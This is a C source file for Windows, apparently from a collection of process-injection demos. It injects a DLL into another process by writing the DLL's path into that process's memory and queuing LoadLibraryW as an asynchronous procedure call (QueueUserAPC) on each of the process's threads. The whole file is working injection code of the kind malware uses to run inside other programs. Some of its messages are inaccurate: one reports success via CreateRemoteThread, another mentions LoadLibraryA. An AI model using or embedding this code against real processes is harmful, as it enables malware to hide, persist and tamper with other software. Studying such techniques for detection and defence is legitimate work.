#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "fheaders.h"
#include "auxiliary.h"

DWORD demoQueueUserAPC(PCWSTR pszLibFile, DWORD dwProcessId)
{
	int cb = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);

	HANDLE hProcess = OpenProcess(
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		wprintf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
		return(1);
	}

	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		wprintf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), dwProcessId);
		return(1);
	}

	LPVOID pfnThreadRtn = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	if (pfnThreadRtn == NULL)
	{
		wprintf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));
		return(1);
	}

	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, cb, NULL);
	if (n == 0)
	{
		wprintf(TEXT("[-] Error: Could not write any bytes into the PID (%d) address space.\n"), dwProcessId);
		return(1);
	}

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		wprintf(TEXT("[-] Error: Unable to get thread information\n"));
		return(1);
	}

	DWORD threadId = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	BOOL bResult = Thread32First(hSnapshot, &threadEntry);
	while (bResult)
	{
		bResult = Thread32Next(hSnapshot, &threadEntry);
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == dwProcessId)
			{
				threadId = threadEntry.th32ThreadID;

				wprintf(TEXT("[+] Using thread: %i\n"), threadId);
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
				if (hThread == NULL)
					wprintf(TEXT("[-] Error: Can't open thread. Continuing to try other threads...\n"));
				else
				{
					DWORD dwResult = QueueUserAPC((PAPCFUNC)pfnThreadRtn, hThread, (ULONG_PTR)pszLibFileRemote);
					if (!dwResult)
						wprintf(TEXT("[-] Error: Couldn't call QueueUserAPC on thread> Continuing to try othrt threads...\n"));
					else
						wprintf(TEXT("[+] Success: DLL injected via CreateRemoteThread().\n"));
					CloseHandle(hThread);
				}
			}
		}
	}

	if (!threadId)
		wprintf(TEXT("[-] Error: No threads found in thr target process\n"));

	CloseHandle(hSnapshot);
	CloseHandle(hProcess);

	return(0);
}